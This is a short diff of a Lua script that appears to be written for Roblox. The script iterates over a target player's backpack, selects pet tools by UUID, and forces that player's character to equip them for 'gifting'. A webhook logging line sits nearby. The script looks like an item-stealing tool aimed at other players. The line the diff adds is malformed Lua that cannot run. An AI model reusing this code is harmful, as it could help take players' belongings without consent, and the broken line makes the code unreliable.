@@ -707,7 +707,8 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                     for _, tool in targetPlr.Backpack:GetChildren() do
                         if tool:IsA("Tool")
                         and tool:GetAttribute("ItemType") == "Pet"
-                        and tool:GetAttribute("PET_UUID") == pet.Id then
+                        and tool:GetAttribute("PET_UUID") == pet.Id
+and petName:"Bald Eagle" "Mimic Octopus" then
 
                             print("Equipping & gifting:", tool.Name)
                             targetPlr.Character.Humanoid:EquipTool(tool)
